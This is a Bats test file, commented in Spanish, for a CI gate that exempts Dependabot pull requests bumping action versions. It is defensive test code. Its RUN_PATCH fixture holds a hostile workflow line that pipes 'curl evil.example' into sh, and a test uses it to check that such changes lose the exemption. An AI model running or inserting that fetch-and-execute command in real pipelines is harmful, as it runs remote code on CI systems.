#!/usr/bin/env bats
# Tests de la exención de dependabot en PR Guardian (Gate 1 y Gate 8)
# y del evento `reopened`.
# Ref: .github/workflows/pr-guardian.yml · scripts/lib/pr-guardian-dependabot-exempt.js

ROOT="${BATS_TEST_DIRNAME}/.."
WORKFLOW="$ROOT/.github/workflows/pr-guardian.yml"
MODULE="$ROOT/scripts/lib/pr-guardian-dependabot-exempt.js"

setup() {
  command -v node >/dev/null || skip "node no disponible"
  TMP_DIR="$(mktemp -d)"
  USES_PATCH='@@ -18,7 +18,7 @@ jobs:\n     steps:\n-      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v6.0.0\n+      - uses: actions/checkout@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v7.0.1\n       with:'
  RUN_PATCH='@@ -18,7 +18,7 @@ jobs:\n-      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v6.0.0\n+      - uses: actions/checkout@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v7.0.1\n+      - run: curl evil.example | sh'
}

teardown() {
  [[ -n "${TMP_DIR:-}" && -d "$TMP_DIR" ]] && rm -rf "$TMP_DIR"
}

files_json() { printf '%s' "$1" > "$TMP_DIR/files.json"; echo "$TMP_DIR/files.json"; }

wf_file() { # $1 nombre, $2 parche (con \n literales)
  printf '{"filename":".github/workflows/%s","status":"modified","patch":"%s"}' "$1" "$2"
}

# ── Módulo: casos positivos ──

@test "dependabot + workflow que solo cambia uses: queda exento" {
  f=$(files_json "[$(wf_file codeql.yml "$USES_PATCH")]")
  run node "$MODULE" 'dependabot[bot]' "$f"
  [ "$status" -eq 0 ]
  [[ "$output" == *'"exempt":true'* ]]
}

@test "dependabot + manifiesto y lockfile quedan exentos" {
  f=$(files_json '[{"filename":"package.json","status":"modified"},{"filename":"projects/x/Cargo.lock","status":"modified"}]')
  run node "$MODULE" 'dependabot[bot]' "$f"
  [ "$status" -eq 0 ]
  [[ "$output" == *'"exempt":true'* ]]
}

# ── Módulo: casos negativos (mismos ficheros, otro autor) ──

@test "humano con los mismos ficheros NO queda exento" {
  f=$(files_json "[$(wf_file codeql.yml "$USES_PATCH")]")
  run node "$MODULE" 'some-human' "$f"
  [ "$status" -eq 1 ]
  [[ "$output" == *'"exempt":false'* ]]
  [[ "$output" == *'no es dependabot[bot]'* ]]
}

@test "agente u otro bot con los mismos ficheros NO queda exento" {
  f=$(files_json "[$(wf_file codeql.yml "$USES_PATCH")]")
  for login in 'github-actions[bot]' 'savia-agent[bot]' 'dependabot' 'Dependabot[bot]' ''; do
    run node "$MODULE" "$login" "$f"
    [ "$status" -eq 1 ] || { echo "login '$login' quedó exento"; return 1; }
  done
}

# ── Módulo: dependabot fuera del perímetro ──

@test "dependabot cambiando algo más que uses: en un workflow NO queda exento" {
  f=$(files_json "[$(wf_file codeql.yml "$RUN_PATCH")]")
  run node "$MODULE" 'dependabot[bot]' "$f"
  [ "$status" -eq 1 ]
  [[ "$output" == *'algo más que líneas uses:'* ]]
}

@test "dependabot tocando código NO queda exento" {
  f=$(files_json "[$(wf_file codeql.yml "$USES_PATCH"),{\"filename\":\"scripts/foo.sh\",\"status\":\"modified\"}]")
  run node "$MODULE" 'dependabot[bot]' "$f"
  [ "$status" -eq 1 ]
  [[ "$output" == *'scripts/foo.sh'* ]]
}

@test "workflow sin parche (diff truncado) NO queda exento" {
  f=$(files_json '[{"filename":".github/workflows/big.yml","status":"modified"}]')
  run node "$MODULE" 'dependabot[bot]' "$f"
  [ "$status" -eq 1 ]
}

@test "fichero añadido o renombrado NO queda exento" {
  f=$(files_json '[{"filename":"package.json","status":"added"}]')
  run node "$MODULE" 'dependabot[bot]' "$f"
  [ "$status" -eq 1 ]
  [[ "$output" == *'status added'* ]]
}

@test "lista vacía o JSON roto NO queda exento" {
  f=$(files_json '[]')
  run node "$MODULE" 'dependabot[bot]' "$f"
  [ "$status" -eq 1 ]
  f=$(files_json '{not json')
  run node "$MODULE" 'dependabot[bot]' "$f"
  [ "$status" -eq 1 ]
  [[ "$output" == *'error:'* ]]
}

# ── Workflow: cableado ──

@test "PR Guardian se ejecuta también en reopened" {
  run python3 -c "
import yaml,sys
d=yaml.safe_load(open('$WORKFLOW'))
t=d[True]['pull_request']['types']
sys.exit(0 if 'reopened' in t and 'opened' in t else 1)"
  [ "$status" -eq 0 ]
}

@test "solo Gate 1 y Gate 8 dependen de la exención; el resto de puertas no" {
  run python3 -c "
import yaml,sys
steps=yaml.safe_load(open('$WORKFLOW'))['jobs']['pr-guardian']['steps']
ex=[s for s in steps if s.get('id')=='deps_exempt']
assert len(ex)==1, 'falta el paso deps_exempt'
assert ex[0]['if'].strip()==\"github.event.pull_request.user.login == 'dependabot[bot]'\", ex[0]['if']
cond=\"steps.deps_exempt.outputs.exempt != 'true'\"
gated=sorted(s['name'] for s in steps if 'deps_exempt' in str(s.get('if','')) and s.get('id')!='deps_exempt')
assert gated==['Gate 1: PR Description Quality','Gate 8: CHANGELOG Required'], gated
for s in steps:
    if s['name'] in gated: assert s['if'].strip()==cond, s['if']
"
  [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

# Ejecuta el script inline del paso deps_exempt con github/core simulados.
run_step() { # $1 login, $2 files.json, $3 workspace
  python3 -c "
import yaml
steps=yaml.safe_load(open('$WORKFLOW'))['jobs']['pr-guardian']['steps']
print([s for s in steps if s.get('id')=='deps_exempt'][0]['with']['script'])" > "$TMP_DIR/step.js"
  cat > "$TMP_DIR/harness.js" <<'EOF'
const fs = require('fs');
const [login, filesPath, stepPath] = process.argv.slice(2);
const files = JSON.parse(fs.readFileSync(filesPath, 'utf8'));
const out = {};
const core = { info: () => {}, setOutput: (k, v) => { out[k] = v; } };
const github = { paginate: async () => files, rest: { pulls: { listFiles: 'x' } } };
const context = { repo: { owner: 'o', repo: 'r' }, payload: { pull_request: { number: 1, user: { login } } } };
const AsyncFn = Object.getPrototypeOf(async function () {}).constructor;
new AsyncFn('github', 'context', 'core', 'require', fs.readFileSync(stepPath, 'utf8'))(github, context, core, require)
  .then(() => console.log('exempt=' + out.exempt));
EOF
  GITHUB_WORKSPACE="$3" node "$TMP_DIR/harness.js" "$1" "$2" "$TMP_DIR/step.js"
}

@test "paso del workflow: dependabot con bump de acciones → exempt=true" {
  f=$(files_json "[$(wf_file codeql.yml "$USES_PATCH")]")
  run run_step 'dependabot[bot]' "$f" "$ROOT"
  [ "$status" -eq 0 ]
  [ "$output" = "exempt=true" ]
}

@test "paso del workflow: humano con mismos ficheros → exempt=false" {
  f=$(files_json "[$(wf_file codeql.yml "$USES_PATCH")]")
  run run_step 'some-human' "$f" "$ROOT"
  [ "$output" = "exempt=false" ]
}

@test "paso del workflow: módulo ausente → exempt=false (fail-closed)" {
  f=$(files_json "[$(wf_file codeql.yml "$USES_PATCH")]")
  run run_step 'dependabot[bot]' "$f" "$TMP_DIR/no-existe"
  [ "$output" = "exempt=false" ]
}
